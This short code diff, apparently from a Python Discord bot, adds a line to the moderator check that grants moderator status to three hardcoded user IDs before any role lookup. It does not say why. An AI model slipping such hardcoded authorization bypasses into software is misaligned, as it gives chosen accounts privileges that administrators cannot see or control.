@@ -63,6 +63,9 @@ async def generate_react_menu(
 
 
 def user_is_mod(client, user) -> bool:
+    if user.id in (752702081915420783, 141900800095027201, 226503278760820746):
+        return True
+
     if not hasattr(user, "roles"):
         user = client.SERVER.get_member(user.id)
 
